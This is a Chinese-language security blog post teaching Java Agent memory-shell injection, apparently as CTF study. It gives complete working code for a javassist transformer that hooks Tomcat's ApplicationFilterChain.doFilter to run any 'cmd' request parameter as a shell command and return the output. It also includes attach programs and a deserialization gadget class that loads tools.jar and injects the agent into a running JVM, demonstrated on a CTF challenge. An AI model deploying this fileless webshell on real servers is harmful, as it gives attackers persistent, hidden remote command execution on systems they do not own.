title: Java Agent内存马学习
author: bmth
tags:
  - 内存马
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/5c12de3229a84ac89e0db81fa6c956f8.png'
cover: 'https://img-blog.csdnimg.cn/5c12de3229a84ac89e0db81fa6c956f8.png'
date: 2022-11-16 23:56:00
---
![](https://img-blog.csdnimg.cn/5c12de3229a84ac89e0db81fa6c956f8.png)

## 前言
这里补充一下java agent内存马的学习，主要是之前笔试的时候有个spring boot命令执行不出网的利用，当时脑子抽了忘记可以使用agent内存马，当时说的是：[Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)
后来反应过来使用agent实现内存马更加简单实用，再加上之前只是知道没有深入学习，所以就有了写这么一篇文章的想法，顺便记录一下学习过程避免遗忘

## 基础知识
在 jdk 1.5 之后引入了`java.lang.instrument`包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过`java.lang.instrument`实现的工具我们称之为**Java Agent**，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法

Java agent的使用方式有两种：
- jvm方式：实现 **premain**方法，在JVM启动前加载
- attach方式：实现 **agentmain**方法，在JVM启动后加载

premain和agentmain函数声明如下：
```java
public static void agentmain(String agentArgs, Instrumentation inst) {
    ...
}

public static void agentmain(String agentArgs) {
    ...
}

public static void premain(String agentArgs, Instrumentation inst) {
    ...
}

public static void premain(String agentArgs) {
    ...
}
```
拥有`Instrumentation inst`参数的方法优先级更高

借一张图可以很方便理解
![](https://img-blog.csdnimg.cn/67f4d598f8b94d668b29da4a11da7921.png)

### premain
环境搭建可以参考：[IDEA + maven 零基础构建 java agent 项目](https://zhuanlan.zhihu.com/p/113523189)

首先我们构建一个新pom项目，然后创建一个类PreDemo，并且实现`premain`方法
```java
import java.lang.instrument.Instrumentation;

public class PreDemo {
    public static void premain(String args, Instrumentation inst){
        for (int i = 0; i < 10; i++) {
            System.out.println("hello I'm premain agent!!!");
        }
    }
}
```
接着在`src/main/resources/`目录下创建`META-INF/MANIFEST.MF`，需要指定`Premain-Class`
```
Manifest-Version: 1.0
Premain-Class: PreDemo
```
**注意最后必须多一个换行**，最后打包成jar即可
![](https://img-blog.csdnimg.cn/d9f31362a80b46169f9639eb49532191.png)

最后带上`-javaagent:java-agent.jar`参数执行，结果如下
![](https://img-blog.csdnimg.cn/9eb0548962e444e3867e91e0e94365bc.png)

可以看到在spring boot开始之前就执行了`premain`方法
但我们内存马注入的情况都是处于 JVM 已运行了的情况，所以要实现内存马的话我们需要在启动后执行，这时候就需要用到另一种方法 agentmain

### agentmain
agentmain 和 premain 差不多，只需要在`META-INF/MANIFEST.MF`中加入`Agent-Class:`即可
```
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: AgentDemo
```
不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了Attach API。Attach API 只有 2 个主要的类，并且都在 `com.sun.tools.attach` 包里面
那么我们先导入tools包，然后着重关注VitualMachine这个类
![](https://img-blog.csdnimg.cn/f0a4f5ccfc6941d6adc7baf389375483.png)

VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类），里面提供了 LoadAgent，Attach 和 Detach 等方法

attach：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上
```java
VirtualMachine vm = VirtualMachine.attach(v.id());
```

loadAgent：向 jvm 注册一个代理程序 agent，在该 agent 的代理程序中会得到一个 Instrumentation 实例，该实例可以在 class 加载前改变 class 的字节码，也可以在 class 加载后重新加载。在调用 Instrumentation 实例的方法时，这些方法会使用 ClassFileTransformer 接口中提供的方法进行处理

detach：从 JVM 上面解除一个代理(agent)

首先写一个简单的agent
```java
import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        for (int i = 0; i < 10; i++) {
            System.out.println("hello I'm agentMain!!!");
        }
    }
}
```
构建成jar包，然后写一个attacher：
```java
import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.AttachNotSupportedException;
import com.sun.tools.attach.VirtualMachine;

import java.io.IOException;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //目标应用程序的进程号
        String id = "3020";
        //agent的绝对地址
        String jarName = "C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\java学习\\java-agent\\out\\artifacts\\java_agent_jar\\java-agent.jar";
        VirtualMachine virtualMachine = VirtualMachine.attach(id);
        virtualMachine.loadAgent(jarName);
        virtualMachine.detach();
    }
}
```
windows环境下必须用管理员权限运行`jps -l`获得我们目标应用的进程号
![](https://img-blog.csdnimg.cn/5086a1bb943f4c529bcf2b0db483cfda.png)

成功attach并加载了agent
![](https://img-blog.csdnimg.cn/bdfb067135a2423695bca5987fd60dd4.png)

### Instrumentation
`Instrumentation`是`JVMTIAgent`（JVM Tool Interface Agent）的一部分。Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果，主要是在`Instrumentation`中增加了名叫 Transformer 的 Class 文件转换器，转换器可以改变二进制流的数据
Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码

来看一下有哪些方法，用cszeromirror师傅的介绍：
```java
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

    ......
}
```
先看一下获取已经加载的类，我们修改一下AgentDemo代码为：
```java
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException {
        Class[] classes = inst.getAllLoadedClasses();
        FileOutputStream fileOutputStream = new FileOutputStream(new File("./classesInfo.txt"));
        for (Class aClass : classes) {
            String result = "class ==> " + aClass.getName() +";"+ "Modifiable ==> " + (inst.isModifiableClass(aClass) ? "true" : "false")+"\n";
            fileOutputStream.write(result.getBytes());
        }
        fileOutputStream.close();
    }
}
```
![](https://img-blog.csdnimg.cn/777fe2d7eff84357838abbb193601811.png)

可以得到目标JVM上所有已经加载的类，并且知道了这些类能否被修改

接下来就是如何使用`addTransformer()`和`retransformClasses()`来篡改Class的字节码，使用的是javassist

## javassist修改字节码
首先pom添加javassist依赖：
```java
<dependency>
	<groupId>org.javassist</groupId>
	<artifactId>javassist</artifactId>
	<version>3.20.0-GA</version>
</dependency>
```
然后看到几个关键的方法
### ClassPool
来看一下官方对他的介绍：
> ClassPool 是 CtClass 对象的容器。CtClass 对象必须从该对象获得。如果 get() 在此对象上调用，则它将搜索表示的各种源 ClassPath 以查找类文件，然后创建一个 CtClass 表示该类文件的对象。创建的对象将返回给调用者。

简单来说，这就是个容器，存放的是`CtClass`对象
获得方法：`ClassPool cp = ClassPool.getDefault();`

如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，**ClassPool 必须添加额外的类搜索路径**，即：`cp.insertClassPath(new ClassClassPath(<Class>));`

### CtClass
可以把它理解成加强版的Class对象，需要从ClassPool中获得
获得方法：`CtClass cc = cp.get(ClassName)`

### CtMethod
同理，可以理解成加强版的Method对象。

获得方法：`CtMethod m = cc.getDeclaredMethod(MethodName)`

这个类提供了一些方法，使我们可以便捷的修改方法体：
```java
public final class CtMethod extends CtBehavior {
    // 主要的内容都在父类 CtBehavior 中
}

// 父类 CtBehavior
public abstract class CtBehavior extends CtMember {
    // 设置方法体
    public void setBody(String src);

    // 插入在方法体最前面
    public void insertBefore(String src);

    // 插入在方法体最后面
    public void insertAfter(String src);

    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);

}
```
传递给方法`insertBefore()`，`insertAfter()` 和 `insertAt()` 的 String 对象是由Javassist 的编译器编译的，也就是我们控制的代码

## 命令执行注入内存马
当我们用户的请求到达Servlet之前，一定会经过 Filter，所以说 `ApplicationFilterchain#dofilter` 方法是一定会被调用的，并且在 `ApplicationFilterChain#doFilter` 中还封装了我们用户请求的 request 和 response
![](https://img-blog.csdnimg.cn/358f0600100e4d89ac7d2f6d30e7dad5.png)

我们只需要在这方法前将我们的内存马写进去即可，参考天下大木头师傅的代码：[浅谈 Java Agent 内存马](http://wjlshare.com/archives/1582)

首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义
AgentDemo.java：
```java
import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
```
DefineTransformer 对 transform 拦截的类进行 if 判断，如果被拦截的 classname 等于 ApplicationFilterChain 的话那么就对其进行字节码动态修改
DefineTransformer.java：
```java
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace('/', '.');
        if (className.equals(ClassName)) {
            ClassPool cp = ClassPool.getDefault();
            if (aClass != null) {
                ClassClassPath classPath = new ClassClassPath(aClass);
                cp.insertClassPath(classPath);
            }
            CtClass cc;
            try {
                cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.ServletRequest req = request;\n" +
                        "javax.servlet.ServletResponse res = response;" +
                        "String cmd = req.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "boolean isLinux = true;\n" +
                        "String osTyp = System.getProperty(\"os.name\");\n" +
                        "if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {isLinux = false;}\n" +
                        "String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};"+
                        "Process process = Runtime.getRuntime().exec(cmds);\n" +
                        "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                        "new java.io.InputStreamReader(process.getInputStream()));\n" +
                        "StringBuilder stringBuilder = new StringBuilder();\n" +
                        "String line;\n" +
                        "while ((line = bufferedReader.readLine()) != null) {\n" +
                        "stringBuilder.append(line + '\\n');\n" +
                        "}\n" +
                        "res.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "res.getOutputStream().flush();\n" +
                        "res.getOutputStream().close();\n" +
                        "}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (NotFoundException | IOException | CannotCompileException e) {
                e.printStackTrace();
            }
        }

        return new byte[0];
    }
}
```
运行发现报错`java.lang.ClassNotFoundException: javassist.ClassPath`
![](https://img-blog.csdnimg.cn/ec99ffed74fe45b1a5fa686ba173cc30.png)

说明编译为jar的时候没有把我们的javassist带上，这里换成使用pom生成jar包，添加如下代码到pom中
```
<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-assembly-plugin</artifactId>
            <configuration>
                <descriptorRefs>
                    <descriptorRef>jar-with-dependencies</descriptorRef>
                </descriptorRefs>
                <archive>
                    <manifestEntries>
                        <Agent-Class>AgentDemo</Agent-Class>
                        <Can-Redefine-Classes>true</Can-Redefine-Classes>
                        <Can-Retransform-Classes>true</Can-Retransform-Classes>
                    </manifestEntries>
                </archive>
            </configuration>

            <executions>
                <execution>
                    <goals>
                        <goal>attached</goal>
                    </goals>
                    <phase>package</phase>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```
然后`mvn assembly:assembly` 命令打包即可，最后尝试加载
```java
import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vir : list) {
            System.out.println(vir.displayName());//打印JVM加载类名
            if (vir.displayName().endsWith("ezjaba.jar")) {
                VirtualMachine attach = VirtualMachine.attach(vir.id());
                String jarName = "C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\java学习\\java-agent\\target\\java-agent-1.0-SNAPSHOT-jar-with-dependencies.jar";
                attach.loadAgent(jarName);
                attach.detach();
            }
        }
    }
}
```
成功植入内存马(注意要先访问一次，确保`org.apache.catalina.core.ApplicationFilterChain`被加载)
![](https://img-blog.csdnimg.cn/80b4414cfc1d4202ba02d69c1d15b216.png)


这里看到一个项目：[https://github.com/ethushiroha/JavaAgentTools](https://github.com/ethushiroha/JavaAgentTools)

我们可以写一个attacher
```java
import com.sun.tools.attach.*;

import java.io.IOException;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        String id = args[0];
        String jarName = args[1];

        System.out.println("id ==> " + id);
        System.out.println("jarName ==> " + jarName);

        VirtualMachine virtualMachine = VirtualMachine.attach(id);
        virtualMachine.loadAgent(jarName);
        virtualMachine.detach();

        System.out.println("ends");
    }
}
```
这样就可以在命令行上执行了
![](https://img-blog.csdnimg.cn/f630f1cb7c71498faa7ddedecdb25903.png)

成功执行命令
![](https://img-blog.csdnimg.cn/e59f43d831b443e6b4833a2902c0165e.png)

## 反序列化注入内存马
命令执行的agent内存马搞定了，但反序列化的又需要如何实现呢
可以知道反序列化可以加载任意类，那么我们写一个 获取 jvm 的 pid 号，然后调用 loadAgent 方法将 agent.jar 注入进去就可以
由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar
首先需要上传我们的spring-agent.jar，然后反序列化
参考天下大木头的代码：
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class TestAgentMain extends AbstractTranslet  {
    public TestAgentMain() throws Exception {
        try {
            java.lang.String path = "/home/bmth/web/spring-agent.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list", null);
            java.util.List list = (java.util.List) listMethod.invoke(MyVirtualMachine, null);

            System.out.println("Running JVM list ...");
            for (int i = 0; i < list.size(); i++) {
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName", null);
                java.lang.String name = (java.lang.String) displayName.invoke(o, null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("ezjaba.jar")) {
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id", null);
                    java.lang.String id = (java.lang.String) getId.invoke(o, null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o, new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm, new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", null);
                    detach.invoke(vm, null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }
}
```
然后我这里拿buu的题目本地测试，就是一个简单的rome链：[https://buuoj.cn/match/matches/57/challenges#EasyJaba](https://buuoj.cn/match/matches/57/challenges#EasyJaba)
![](https://img-blog.csdnimg.cn/eaa5ee6830aa407799a73cb0a30b2f2f.png)

最后访问任意路径都可rce
![](https://img-blog.csdnimg.cn/0eb8347f422e4a9583169a6484d015cb.png)


参考：
[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/)
[利用“进程注入”实现无文件复活 WebShell](https://www.freebuf.com/articles/web/172753.html)
[擅长捉弄的内存马同学：Agent内存马（低卡）](https://www.freebuf.com/articles/web/323621.html)
[Java Agent 从入门到内存马](https://xz.aliyun.com/t/9450)
[论如何优雅的注入 Java Agent 内存马](https://paper.seebug.org/1945/)
